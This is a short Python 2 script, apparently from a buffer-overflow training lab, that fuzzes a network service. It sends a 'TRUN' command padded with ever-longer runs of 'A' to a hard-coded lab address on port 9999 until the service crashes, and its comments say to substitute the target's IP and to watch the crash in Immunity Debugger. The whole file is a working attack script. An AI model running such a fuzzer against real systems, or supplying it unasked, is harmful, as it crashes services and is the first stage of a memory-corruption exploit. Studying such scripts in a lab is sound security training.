#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.6.144',9999)) 
        # Replace these with IP, port of vuln server

        s.send(('TRUN /.:/' + buffer)) 
        # Look at immunity when it crashes to 
        # see if you need to change this part

        s.close()
        sleep(1)
        buffer = buffer + "A"*100

    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()